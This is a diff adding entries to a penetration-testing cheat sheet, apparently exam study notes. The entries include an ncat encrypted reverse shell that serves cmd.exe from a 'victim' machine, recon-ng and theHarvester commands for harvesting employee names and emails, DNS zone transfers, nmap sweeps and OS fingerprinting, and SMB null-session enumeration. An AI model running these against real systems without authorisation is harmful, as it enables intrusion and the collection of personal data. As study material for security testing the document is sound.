@@ -4,7 +4,89 @@
 ## DNS
 
 
+# Essential Tools
 
+## Ncat
+
+Encrypted Reverse Shell
+```console
+on victim machine (Win):
+ncat --exec cmd.exe --allow <IP> -vnl <PORT> --ssl
+
+on attacking machine (Kali):
+ncat -v <IP> <PORT> --ssl
+
+```
+
+## Tcpdump
+
+Read PCAP file
+```console
+tcpdump -r <FILE.pcap>
+```
+
+Get IP addresses & ports involved
+```console
+tcpdump -n -r <FILE.pcap> | awk -F " " '{print $3}' | sort -u | head
+```
+
+Filter for source and destination IPs and ports
+```console
+tcpdump -n src host <IP> -r <FILE.pcap> 
+tcpdump -n dst host <IP> -r <FILE.pcap> 
+tcpdump -n port <PORT> -r <FILE.pcap>
+```
+
+View content of a packet
+```console
+tcpdump -nX -s 0 -r <FILE.pcap>
+```
+
+# Passive Information Gathering
+
+## Google
+
+```console
+site:  
+-site:  
+filetype: 
+intitle:  
+inurl:
+```
+more info: https://www.exploit-db.com/google-hacking-database
+
+## Mail Harvesting
+
+The Harvester
+```console
+theharvester -d <DOMAIN> -b <SEARCH ENGINE> -l <LIMIT OF RESULTS>
+```
+
+## Web Reconnaissance with Recon-NG
+
+Generating list of employee names and mail addresses
+```console
+recon-ng
+use recon/domains-contacts/whois_pocs
+set source <DOMAIN>
+run
+```
+
+Compiling a list of reported XSS vulnerabilities
+```console
+recon-ng
+use recon/domains-vulnerabilities/xssed
+set source <DOMAIN>
+run
+```
+
+Search for sub-domains
+```console
+recon-ng
+use recon/domains-hosts/google_site_web
+set source <DOMAIN>
+run
+```
 
 # Active Information Gathering
 
@@ -16,7 +98,18 @@ host -t NS <DOMAIN/IP> | cut d " " -f 4
 
 other types:
 MX  mail
+PTR pointer
+TXT text record
+```
 
+DNSRecon 
+```console
+dnsrecon -d <DOMAIN> -t axfr
+```
+
+DNSenum
+```console
+dnsenum <DOMAIN>
 ```
 
 Forward Lookup Brute Force
@@ -79,15 +172,50 @@ Light scan
 nmap <IP> --top-ports 10 --open
 ```
 
+Ping Sweep
+```console
+nmap -v -sn <IP-RANGE> -oG pingsweep.txt
+grep Up pingsweep.txt | cut -d " " -f 2
+```
+
+Port Sweep
+```console
+nmap -p <PORT> <IP-RANGE> -oG websweep.txt
+grep Up portsweep.txt | cut -d " " -f 2
+```
+
+Banner Grabbing
+```console
+nmap -sV -sT <IP-RANGE>
+```
+
+OS-Fingerprinting
+```console
+nmap -O <IP-RANGE>
+```
+
 Heavy scan
 ```console
 nmap <IP> -p- -sV --reason --dns-server <DNS-SERVER>
 ```
 
+Scanning for Top 20 used ports
+```console
+nmap -sT -A --top-ports=20 <IP-RANGE>
+```
+
 UDP scan
 ```console
-nc -nv -u -z -w 1 <IP> <PORT(s)>
+nc -nv -u -z -w 1 <IP> <PORTs>
 ```
+
+Connect Scanning (TCP - three-way-handshake)
+```console
+nc -nvv -w 1 -z <IP> <PORTs>
+OR
+nmap -sT (-p 1-65535) <IP>
+```
+
 
 ## Services
 
@@ -134,7 +262,7 @@ Scanning for SMB
 ```console
 nbtscan <IP range>
 
-e.g.: 10.11.1.1 254
+e.g.: 10.11.1.0/24
 ```
 
 Enumerate OS version
@@ -152,7 +280,7 @@ rpcclient -U "" <IP>
 'getdompwinfo'  shows pwd info
 ```
 
-Enum4Linux
+Null Sessions (Enum4Linux) 
 ```console
 enum4linux -av <IP>
 ```
